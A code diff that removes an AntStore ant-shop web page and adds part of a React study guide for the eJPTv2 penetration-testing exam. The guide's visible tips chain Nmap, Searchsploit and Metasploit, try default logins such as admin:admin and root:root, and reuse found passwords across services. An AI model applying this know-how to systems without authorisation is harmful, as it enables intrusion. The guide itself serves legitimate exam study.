-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Kit de alimentación</h5>
-                        <p class="card-text flex-grow-1">Variedad de alimentos especializados para tus hormigas.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">19.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-3 mb-4">
-                <div class="card h-100 animate__animated animate__fadeInRight">
-                    <span class="product-badge">Oferta</span>
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Set de herramientas">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Set de herramientas completo</h5>
-                        <p class="card-text flex-grow-1">Todo lo que necesitas para el mantenimiento de tu hormiguero.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0"><del>39.99€</del> 29.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="container my-5" id="testimonios">
-        <h2 class="text-center mb-4 section-title animate__animated animate__fadeInUp">Testimonios de Clientes</h2>
-        <div class="row">
-            <div class="col-md-4 mb-4">
-                <div class="testimonial animate__animated animate__fadeInLeft">
-                    <div class="d-flex align-items-center mb-3">
-                        <img src="https://randomuser.me/api/portraits/men/1.jpg" alt="Cliente 1">
-                        <div>
-                            <h5 class="mb-0">Juan Pérez</h5>
-                            <small>Cliente desde 2020</small>
-                        </div>
-                    </div>
-                    <p>"AntStore ha sido una revelación para mí. Sus productos son de alta calidad y el servicio al cliente es excepcional."</p>
-                </div>
-            </div>
-            <div class="col-md-4 mb-4">
-                <div class="testimonial animate__animated animate__fadeInUp">
-                    <div class="d-flex align-items-center mb-3">
-                        <img src="https://randomuser.me/api/portraits/women/2.jpg" alt="Cliente 2">
-                        <div>
-                            <h5 class="mb-0">María García</h5>
-                            <small>Cliente desde 2021</small>
-                        </div>
-                    </div>
-                    <p>"Gracias a AntStore, he podido iniciar mi colonia de hormigas con confianza. Sus guías y productos son excelentes."</p>
-                </div>
-            </div>
-            <div class="col-md-4 mb-4">
-                <div class="testimonial animate__animated animate__fadeInRight">
-                    <div class="d-flex align-items-center mb-3">
-                        <img src="https://randomuser.me/api/portraits/men/3.jpg" alt="Cliente 3">
-                        <div>
-                            <h5 class="mb-0">Carlos Rodríguez</h5>
-                            <small>Cliente desde 2019</small>
-                        </div>
-                    </div>
-                    <p>"La mejor tienda para los amantes de las hormigas. Productos de calidad y un servicio al cliente inigualable."</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="container my-5" id="contacto">
-        <h2 class="text-center mb-4 section-title">Contacto</h2>
-        <div class="row">
-            <div class="col-md-6">
-                <form id="contact-form">
-                    <div class="mb-3">
-                        <label for="nombre" class="form-label">Nombre</label>
-                        <input type="text" class="form-control" id="nombre" required>
-                    </div>
-                    <div class="mb-3">
-                        <label for="email" class="form-label">Email</label>
-                        <input type="email" class="form-control" id="email" required>
-                    </div>
-                    <div class="mb-3">
-                        <label for="mensaje" class="form-label">Mensaje</label>
-                        <textarea class="form-control" id="mensaje" rows="3" required></textarea>
-                    </div>
-                    <button type="submit" class="btn btn-primary">Enviar</button>
-                </form>
-            </div>
-            <div class="col-md-6">
-                <h4>Información de contacto</h4>
-                <p><i class="fas fa-map-marker-alt"></i> <strong>Dirección:</strong> Calle de las Hormigas, 123, 28001 Madrid</p>
-                <p><i class="fas fa-phone"></i> <strong>Teléfono:</strong> +34 912 345 678</p>
-                <p><i class="fas fa-envelope"></i> <strong>Email:</strong> info@antstore.com</p>
-                <p><i class="fas fa-clock"></i> <strong>Horario:</strong> Lunes a Viernes, 9:00 - 18:00</p>
-                <div class="mt-4">
-                    <h5>Síguenos en redes sociales</h5>
-                    <a href="#" class="text-dark me-2 social-icon"><i class="fab fa-facebook fa-2x"></i></a>
-                    <a href="#" class="text-dark me-2 social-icon"><i class="fab fa-instagram fa-2x"></i></a>
-                    <a href="#" class="text-dark me-2 social-icon"><i class="fab fa-twitter fa-2x"></i></a>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <footer class="text-white text-center py-4">
-        <div class="container">
-            <p>&copy; 2023 AntStore. Todos los derechos reservados.</p>
-            <p>Diseñado con <i class="fas fa-heart"></i> por amantes de las hormigas</p>
-        </div>
-    </footer>
-
-    <button id="back-to-top" class="btn btn-primary" title="Volver arriba">
-        <i class="fas fa-arrow-up"></i>
-    </button>
-
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
-    <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        const filterButtons = document.querySelectorAll('.filter-btn');
-        const hormigueroItems = document.querySelectorAll('.hormiguero-item');
-        const addToCartButtons = document.querySelectorAll('.btn-primary');
-        const cartCount = document.querySelector('.cart-count');
-        const cartItems = document.getElementById('cart-items');
-        const cartTotal = document.getElementById('cart-total');
-        const checkoutBtn = document.getElementById('checkout-btn');
-        const backToTopBtn = document.getElementById('back-to-top');
-        const contactForm = document.getElementById('contact-form');
-        let cart = [];
-
-        // Animación de entrada
-        gsap.from('.card', {
-            duration: 1,
-            y: 50,
-            opacity: 0,
-        });
-
-        filterButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                const filter = button.getAttribute('data-filter');
                 
-                hormigueroItems.forEach(item => {
-                    if (filter === 'all' || item.getAttribute('data-category') === filter) {
-                        item.style.display = 'block';
-                    } else {
-                        item.style.display = 'none';
-                    }
-                });
-
-                filterButtons.forEach(btn => btn.classList.remove('active'));
-                button.classList.add('active');
-            });
-        });
-
-        addToCartButtons.forEach(button => {
-            button.addEventListener('click', (e) => {
-                e.preventDefault();
-                const card = button.closest('.card');
-                const title = card.querySelector('.card-title').textContent;
-                const price = parseFloat(card.querySelector('.h5').textContent.replace('€', '').replace(',', '.'));
-                
-                addToCart(title, price);
-                updateCartUI();
-            });
-        });
-
-        function addToCart(title, price) {
-            const existingItem = cart.find(item => item.title === title);
-            if (existingItem) {
-                existingItem.quantity++;
-            } else {
-                cart.push({ title, price, quantity: 1 });
-            }
-        }
-
-        function updateCartUI() {
-            cartCount.textContent = cart.reduce((total, item) => total + item.quantity, 0);
-            cartItems.innerHTML = cart.map(item => `
-                <div class="cart-item mb-2">
-                    <span>${item.title} x ${item.quantity}</span>
-                    <span class="float-end">${(item.price * item.quantity).toFixed(2)}€</span>
+                <div className="bg-gray-900 p-3 rounded font-mono text-sm text-green-400 mb-2 overflow-x-auto">
+                  {example.command.split('\n').map((line, i) => (
+                    <div key={i} className="whitespace-nowrap">
+                      {line.startsWith('#') ? (
+                        <span className="text-gray-500">{line}</span>
+                      ) : (
+                        <><span className="text-blue-400">$</span> {line}</>
+                      )}
+                    </div>
+                  ))}
                 </div>
-            `).join('');
-            cartTotal.textContent = cart.reduce((total, item) => total + item.price * item.quantity, 0).toFixed(2) + '€';
-        }
+                
+                <div className="text-sm text-gray-300 flex items-start gap-2">
+                  <span className="text-blue-400 shrink-0">💡</span>
+                  <span>{example.explanation}</span>
+                </div>
+              </div>
+            ))}
+          </div>
+        )}
+      </div>
+    );
+  };
 
-        checkoutBtn.addEventListener('click', () => {
-            if (cart.length === 0) {
-                alert('Tu carrito está vacío');
-            } else {
-                alert('Gracias por tu compra. Total: ' + cartTotal.textContent);
-                cart = [];
-                updateCartUI();
-            }
-        });
-    });
-    </script>
-</body>
-</html>
+  return (
+    <div className="min-h-screen bg-gray-900 text-white p-6">
+      <div className="max-w-6xl mx-auto">
+        <div className="text-center mb-8">
+          <h1 className="text-4xl font-bold mb-2 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
+            eJPTv2 - Guía de Herramientas con Ejemplos
+          </h1>
+          <p className="text-gray-400">Casos de uso reales para cada herramienta</p>
+        </div>
+
+        <div className="mb-8 bg-gradient-to-r from-blue-900 to-purple-900 p-6 rounded-xl shadow-2xl">
+          <h2 className="text-xl font-bold mb-3 flex items-center gap-2">
+            <Search size={24} />
+            Cómo usar esta guía
+          </h2>
+          <div className="grid md:grid-cols-3 gap-4 text-sm">
+            <div className="bg-gray-800 p-3 rounded-lg">
+              <div className="font-bold text-green-400 mb-1">1️⃣ Selecciona Herramienta</div>
+              <div className="text-gray-300">Haz clic en cualquier herramienta</div>
+            </div>
+            <div className="bg-gray-800 p-3 rounded-lg">
+              <div className="font-bold text-yellow-400 mb-1">2️⃣ Ver Ejemplos</div>
+              <div className="text-gray-300">Cada ejemplo muestra un caso específico</div>
+            </div>
+            <div className="bg-gray-800 p-3 rounded-lg">
+              <div className="font-bold text-blue-400 mb-1">3️⃣ Aplicar</div>
+              <div className="text-gray-300">Copia y adapta los comandos</div>
+            </div>
+          </div>
+        </div>
+
+        {categories.map(category => (
+          <div key={category} className="mb-8">
+            <h2 className="text-2xl font-bold mb-4 text-purple-400 flex items-center gap-2">
+              <ChevronRight size={24} />
+              {category}
+            </h2>
+            <div className="space-y-3">
+              {Object.entries(tools)
+                .filter(([_, data]) => data.category === category)
+                .map(([key, data]) => (
+                  <ToolCard key={key} toolKey={key} data={data} />
+                ))}
+            </div>
+          </div>
+        ))}
+
+        <div className="mt-8 bg-gradient-to-r from-green-900 to-blue-900 p-6 rounded-xl">
+          <h3 className="font-bold text-yellow-400 mb-3 text-xl flex items-center gap-2">
+            <Shield size={24} />
+            Tips Pro para el Examen
+          </h3>
+          <div className="grid md:grid-cols-2 gap-3 text-sm">
+            <div className="bg-gray-800 p-3 rounded">
+              ✅ Combina herramientas: Nmap → Searchsploit → Metasploit
+            </div>
+            <div className="bg-gray-800 p-3 rounded">
+              ✅ Guarda todos los outputs: -o output.txt
+            </div>
+            <div className="bg-gray-800 p-3 rounded">
+              ✅ Prueba credenciales default: admin:admin, root:root
+            </div>
+            <div className="bg-gray-800 p-3 rounded">
+              ✅ Reutiliza passwords encontradas en todos los servicios
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <style jsx>{`
+        @keyframes fadeIn {
+          from { opacity: 0; transform: translateY(-10px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-fadeIn {
+          animation: fadeIn 0.3s ease-out;
+        }
+      `}</style>
+    </div>
+  );
+};
+
+export default EjptToolExamples;
